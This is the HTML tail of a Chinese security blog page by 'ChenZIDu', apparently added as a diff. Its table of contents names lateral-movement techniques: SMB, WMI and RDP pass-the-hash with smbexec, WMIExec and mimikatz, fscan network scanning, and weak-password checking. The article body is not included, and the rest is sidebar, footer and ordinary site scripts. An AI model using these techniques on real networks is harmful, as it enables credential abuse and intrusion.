+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#smb"><span class="nav-number">1.</span> <span class="nav-text">smb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍"><span class="nav-number">1.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单IP"><span class="nav-number">1.2.</span> <span class="nav-text">单IP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#smbexec-hash传递"><span class="nav-number">1.2.1.</span> <span class="nav-text">smbexec_hash传递</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SMBExec-hash探测"><span class="nav-number">1.2.2.</span> <span class="nav-text">SMBExec_hash探测</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网段"><span class="nav-number">1.3.</span> <span class="nav-text">网段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fscan-SMB探测"><span class="nav-number">1.3.1.</span> <span class="nav-text">fscan_SMB探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ps1-hash传递"><span class="nav-number">1.3.2.</span> <span class="nav-text">Ps1_hash传递</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RDP"><span class="nav-number">2.</span> <span class="nav-text">RDP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍-1"><span class="nav-number">2.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单IP-1"><span class="nav-number">2.2.</span> <span class="nav-text">单IP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz-hash传递"><span class="nav-number">2.2.1.</span> <span class="nav-text">mimikatz_hash传递</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网段-1"><span class="nav-number">2.3.</span> <span class="nav-text">网段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fscan-扫描"><span class="nav-number">2.3.1.</span> <span class="nav-text">fscan_扫描</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMI"><span class="nav-number">3.</span> <span class="nav-text">WMI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍-2"><span class="nav-number">3.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单IP-2"><span class="nav-number">3.2.</span> <span class="nav-text">单IP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WMIExec-hash传递"><span class="nav-number">3.2.1.</span> <span class="nav-text">WMIExec_hash传递</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">3.2.2.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网段-2"><span class="nav-number">3.3.</span> <span class="nav-text">网段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Ps1-hash传递-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">Ps1_hash传递</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#-1"><span class="nav-number">4.</span> <span class="nav-text"></span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#超级弱口令检查工具-SMB-RDP"><span class="nav-number">4.1.</span> <span class="nav-text">超级弱口令检查工具 SMB&#x2F;RDP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具"><span class="nav-number">4.2.</span> <span class="nav-text">工具</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.suk1.top/" title="https:&#x2F;&#x2F;www.suk1.top&#x2F;" rel="noopener" target="_blank">晓黑</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.dreams-wj.top/" title="https:&#x2F;&#x2F;blog.dreams-wj.top" rel="noopener" target="_blank">HKer_YM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ncsec.cn/" title="https:&#x2F;&#x2F;blog.ncsec.cn&#x2F;" rel="noopener" target="_blank">RoarNya</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChenZIDu</span>
+</div>
+  <div class="powered-by">Oinsm
+    
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Web – <a href="https://github.com/ChenZIDu" rel="noopener" target="_blank">🙂</a>
+    
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'Kp900xxAQMLq3K0AkgqsPzcV-gzGzoHsz',
+    appKey: 'XdnaoJVs9feaETzUFPUq79tD',
+    placeholder: "Just go go",
+    avatar: 'robohash',
+    meta: guest,
+    pageSize: '5' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: true,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
